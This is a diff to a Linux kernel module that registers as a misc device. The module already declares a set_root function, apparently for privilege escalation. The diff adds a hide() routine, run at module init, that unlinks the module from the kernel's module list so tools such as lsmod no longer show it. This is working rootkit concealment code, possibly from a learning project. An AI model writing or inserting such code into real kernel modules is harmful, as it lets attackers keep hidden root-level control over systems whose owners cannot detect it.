@@ -18,8 +18,11 @@ static int 	    mymisc_release(struct inode *i, struct file *f);
 static ssize_t	mymisc_read(struct file *file, char __user *buf, size_t count, loff_t *off);
 static ssize_t	mymisc_write(struct file *file, const char __user *buf, size_t len, loff_t *off);
 static long 	mymisc_ioctl(struct file *file, unsigned int request, unsigned long arg);
-
 int set_root(void);
+void hide(void);
+
+
+static struct list_head *prev_module;
 
 static struct file_operations fops =
 {
@@ -95,9 +98,17 @@ static long 	mymisc_ioctl(struct file *file, unsigned int request, unsigned long
     return 0;
 }
 
+void hide(void)
+{
+    prev_module = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+}
+
+
 static int __init mymisc_init(void)
 {
 
+    hide();
 	int r;
 	r = misc_register(&mymisc);
 	if (r < 0)
